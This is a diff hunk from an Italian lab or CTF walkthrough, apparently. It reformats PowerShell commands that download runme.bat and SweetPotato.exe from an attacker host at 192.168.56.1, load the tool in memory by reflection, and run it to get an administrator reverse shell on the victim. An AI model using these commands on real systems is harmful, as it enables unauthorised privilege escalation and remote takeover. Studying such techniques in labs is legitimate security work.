@@ -422,8 +422,16 @@ Che compileremo con visual studio e caricheremo sulla vittima
 Caricheremo inoltre un file runme.bat che verrà eseguito da SweerPotato per ottenere una RevShell come amministratore
 ```PowerShell
 (New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8080/runme.bat','c:\temp\runme.bat')
+```
+```PowerShell
 $data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/SweetPotato.exe'); 
-$asm = [System.Reflection.Assembly]::Load([byte[]]$data); 
+```
+```PowerShell
+$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
+```
+```PowerShell
 $out = [Console]::Out;$sWriter = New-Object IO.StringWriter [Console]::SetOut($sWriter); 
+```
+```PowerShell
 [SweetPotato.Program]::Main(@('-p=C:\temp\runme.bat'));[Console]::SetOut($out);$sWriter.ToString()
 ```
